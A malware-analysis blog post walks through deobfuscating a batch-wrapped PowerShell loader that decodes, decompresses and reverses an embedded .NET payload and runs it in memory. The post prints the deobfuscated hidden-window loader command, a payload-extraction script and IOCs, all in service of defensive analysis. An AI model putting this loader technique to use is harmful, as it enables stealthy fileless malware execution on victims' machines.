---
layout: post
title:  "Obfuscated PowerShell (with Batch Wrapper): From Obfuscation to In-Memory Execution of .NET payload"
date:   2025-05-05
---

<p class="intro"><span class="dropcap">O</span>bfuscated PowerShell script has been identified that loads a .NET assembly into memory and executes it from memory. This malware sample is a batch file script but it contains PowerShell component exhibits multiple techniques commonly associated with fileless attacks such as Base64 encoding, GZIP compression, byte-order manipulation and reflective in-memory loading via the .NET runtime. Deobfuscation and stepwise analysis reveal how the loader achieves stealthy execution without writing the final binary to disk, classic fileless tricks to stay hidden and annoy defenders.</p>

Sample can be downloaded from <a href="https://www.virustotal.com/gui/file/2d67d7cf11eb806dbb8b0fc9e972e19322b961e260692fa4b6552df7d92b2703
" target="_blank">VirusTotal</a>

**SHA256:2d67d7cf11eb806dbb8b0fc9e972e19322b961e260692fa4b6552df7d92b2703**

So it starts with random variable initialization and calls it at the end. This is common obfuscation technique to make analysis harder.

<figure>
	<img src="/assets/img/ObfuscatedPowershell/1.png" alt=""> 
	<figcaption>The initial of the script</figcaption>
</figure>

It sets the variable with unreadable names. What we can do, we can print the output by doing the following (Doing the print does not run the code so it is safe. Do not just call the variable as it can accidentally run the malicious code).

You can create .bat file and paste the following code:
```powershell
@echo off
set "ԹըԸՓрП=0\powe"
:: Artyoag Bjwmqpvdca
:: Yxzqvunih Jrqwtep
:: Usclce Sykcvapklm Hechxfhjvv
set "ՃՀԷՎԵկգ="%~0.Oek""
set "ԲշՇԲՏՄլ=dowsPo"
set "ՌвՒՁՅ=64\Win"
:: Jinitygwp
:: Whnmo Fyskxd
set "ՅնզզշճԻԹՁ=py /d "
:: Avwegzkeabp Ssner
:: Mkqdlq Swlshzcgn
:: Dirkvk Frjvj
set "ЦԸձԺՎյ=echo F"
set "РԿթуцՔԶиե=/h /i "
:: Bjxdn
:: Xenrbib Qfxdsnecx Dzjuculn
set "ԼոՏԹՒр= | xco"
:: Cbestak Xpdyrjy
:: Vtedxz Lvdflspma
:: Zscuq
set "ՂսջԿՈՌԹ=werShe"
:: Mhojw Mvdptjsgcw
set "ՀՐԲԲԶԺԸՌ=ll\v1."
set "ԿեПՋԺՑԴՑ=SysWOW"
set "ԿՅрձи=rshell"
set "ԽջոԼՅв=/q /y "
set "ՑԵՑՀԳ=ndows\"
set "ПпՈՂу="C:\Wi"
set "ԸժԴՅԹՒ=.exe" "

set Command=”%ЦԸձԺՎյ%%ԼոՏԹՒр%%ՅնզզշճԻԹՁ%%ԽջոԼՅв%%РԿթуцՔԶиե%%ПпՈՂу%%ՑԵՑՀԳ%%ԿեПՋԺՑԴՑ%%ՌвՒՁՅ%%ԲշՇԲՏՄլ%%ՂսջԿՈՌԹ%%ՀՐԲԲԶԺԸՌ%%ԹըԸՓрП%%ԿՅрձи%%ԸժԴՅԹՒ%%ՃՀԷՎԵկգ%”
echo %Command%

pause
```

This will print the output of the combination of the variable that is stored in “Command” which I have added. I insert pause cause it is not then CMD will exit. You can paste this in txt and change the extension to .bat. Open powershell and run it by doing “Start-Process <filename.bat>”. You will get this:
<figure>
	<img src="/assets/img/ObfuscatedPowershell/2.png" alt=""> 
	<figcaption>Batch output after deobsfuscation</figcaption>
</figure>
The output: 
```batch
"echo F | xcopy /d /q /y /h /i "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" "%~0.Oek""
```

You can continue to do the same until line 272 and 274 where the variables are being called.
```powershell
%ՍՈмԾխՀՎԽԷ%%ՑԻՏՑխՅՏ%%ԵՐԻՈՌԵ%%ՇբըԺեն%%ՔчնջԿԽ%%ՋՆՀцԸ%%ՔՄՒԽթ%%ՀծնոէрՁԵ%%ԿշդԳՏՆиէ%%ՆէՄլԿи%%ՋյՓԻԵԵтբղ%%ՓԿբՁт%%ԹխխՓխՐխмп%%ՇՋԴԵեп%%ՍհԽղвն%%ՌԴՅՉշр%%ТՋթլՓ%%ԽճтԺհ%%ՋՂԶуԿԴп%%ԹԲмձԿ%%ԳըиլոՑвթ%%ՔвՍզцпиյ%%ԴиՐвՈ%%ԸնոսՒ%%ԸрцԺբԶԺмյ%%ПճпզԶՆՒ%%ԵцՁձկ%%ТըՅէզ%%ԺբиՑՍ%%ՐՑՑՏգ%%ՃՄյԾԶ%%ПՆՉնПԲՀ%%ԿՎծՎյԴկճ%%ЧթՎխԴп%%ԷԺՐՀу%%ՄՃդգըՅկՈլ%%ՃգՉԴՄդ%%ПշԲԻрզ%%ԷՑтշձՂ%%Քսճит%%ՄՐՏեՇծՒԽ%%ԿոՃԴՓՑ%%УնՈծрՐич%%ԸՏԷՃժէрՉ%%ՌԵррՈճ%%ПрճԹզ%%ՃթըՏцՈ%%ՓՈնէԾՀճ%%ՎբթՐвՋըս%%ԳуԶԸՍ%%ՌՂՇՎԾՒԼկԺ%%ԷծեՃն%%ԹԲՀէтԼխ%%ՈԼհԸսՓ%%ԼէոՏПՋն%%ՏճշՔջ%%ԾԵլՀՄՋԶՌ%%ԶձԶլԸգճԶ%%ԻՇтըձՈՑս%%ВյՈԺլնոи%%ԶՌԻԺկՅ%%МԿյհհԶխ%%ԲпԶսէշ%%ՃՋեиըпрԷ%%ՈрвկԾԽԳ%%ԼոцԻԽծ%%ПթժԹՆՂ%%ԶյձժмզԶԾյ%%ԹգрՄиуԳП%%ЦՃճпԿԸԾр%%ՓпՉՅգսՌ%%ՒեрՑդу%%ԻգԻնՉ%%ИթճцՅԾՇ%%ԴդըԺՅԿՏпո%%ПрբԲц%%РвՅհձխՑՌթ%%ЧՃԷՈղ%%ԷկтԳՆոՄ%%ԺиԿԻՇрՀ%%Լնզпսը%%ՋէհԲհП%%ВԲճՄշՇ%%РԽելՔ%%ԷуՈզԽ%%ՀըмճрՈуԲ%%ТէՈեՏ%%ՁծջԵԻՍեկԻ%%ՀսԲթр%%ИчпиԷиՃ%%РՉՇԳբէՂԹ%%Լпյрգ%%ЦԼՍԻղ%%ՏурխխՐ%%ԿՅՋԸՐԲԹնԸ%%ԾեՅԹո%%ՃԹշթշՍՔԾ%%ԲԿԳпв%%ЧԼՃսՆյмП%%ՏձՋԹՀէцԷը%%ԻզпՈխն%%ԾէՏՇէՐԾ%%ЧՎգկԴզ%%ՃՋԿԸգрՒвԵ%%ՏՂՅՅпՈ%%ԹԲըծՏ%%ЧյԿвՋԾ%%ՋԶելշпԻէՅ%%ՀԽՌԿլՀՍвп%%РըԴՒն%%ՂчնՉуԹղթ%%ՋԾժцՔԿԲ%%ԹՌԳԵՐԿէՆ%%ԲԸпՅԴ%%ПпճՆՅ%%ТթՏՄՑՆգмՑ%%ՍрՄՏէՅՅՆ%%ՀդуԹԼժ%%ՉԸмՒղՍՁрԾ%%ԸՅՓՍԶգԵ%%ԿԵբԹԲԷ%%ЦԻԶսՑԲм%
```

You can just echo the variable and it will give the following output:
```powershell
"%~0.Oek" -WindowStyle Hidden -Command "$Aostyn = Get-Content -LiteralPath (Get-Item env:Xkojoswjy).Value | Select-Object -Last 1; $Rwjgr = [Convert]::FromBase64String($Aostyn); $Tvsslit = New-Object IO.MemoryStream(, $Rwjgr); $Ntghzskd = New-Object IO.MemoryStream; $Awwapkul = New-Object IO.Compression.GzipStream($Tvsslit, [IO.Compression.CompressionMode]::Decompress); $Awwapkul.CopyTo($Ntghzskd); $Awwapkul.Close(); $Tvsslit.Close(); [byte[]] $Rwjgr = $Ntghzskd.ToArray(); [Array] Reverse($Rwjgr); $Kkyrkdktb = [System.AppDomain]::CurrentDomain.Load($Rwjgr); $Agjvrumum = $Kkyrkdktb.EntryPoint; $Agjvrumum.DeclaringType.InvokeMember($Agjvrumum.Name, [System.Reflection.BindingFlags]::InvokeMethod, $null, $null, $null) | Out-Null"
```

So to summarize, what it does are:
1. Select-Object -Last 1 which copy all strings from the last line (line 278)
2. Convert the strings from Base64.
   $Rwjgr = [Convert]::FromBase64String($Aostyn)
3. Will copy to memory and decompress
   $Awwapkul = New-Object IO.Compression.GzipStream($Tvsslit, [IO.Compression.CompressionMode]::Decompress)
4. Reverse the strings in bytes
   [byte[]] $Rwjgr = $Ntghzskd.ToArray(); [Array] Reverse($Rwjgr)

We can get the 2nd stage payload using Cyberchef:
<figure>
	<img src="/assets/img/ObfuscatedPowershell/3.png" alt=""> 
	<figcaption>Reverse with CyberChef</figcaption>
</figure>

Click the save button and Cyberchef will automatically detects the extension which is in this case, it is .exe since it starts with MZ…
<figure>
	<img src="/assets/img/ObfuscatedPowershell/4.png" alt=""> 
	<figcaption>Save the Payload</figcaption>
</figure>

So that is the 2nd stage payload which is PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows.

NOTE: This is a fileless attack where the .exe file is not dropped on the disk but it is loaded directly into memory.

Second Option: You can also do this to get the payload:
```powershell
$Aostyn = ‘the code’
# Decode Base64
$Rwjgr = [Convert]::FromBase64String($Aostyn)

# Decompress GZip
$Tvsslit = New-Object IO.MemoryStream(, $Rwjgr)
$Ntghzskd = New-Object IO.MemoryStream
$Awwapkul = New-Object IO.Compression.GzipStream($Tvsslit, [IO.Compression.CompressionMode]::Decompress)
$Awwapkul.CopyTo($Ntghzskd)
$Awwapkul.Close()
$Tvsslit.Close()

# Reverse the byte array
[byte[]] $ReversedPayload = $Ntghzskd.ToArray()
[Array]::Reverse($ReversedPayload)

# Save reversed payload sample for analysis
[System.IO.File]::WriteAllBytes("C:\<location>\payload_reversed.bin", $ReversedPayload)
```

You will get the payload dropped.

IOCs:<br>
af5834ff652a4d10cff2d4bac492e930ecd9d63a1485b5dcdb6a2e06ddb83d1d (.NET payload)<br>

hxxps://sphd-ci[.]com/spacingFiles/configx/Odnbxum.wav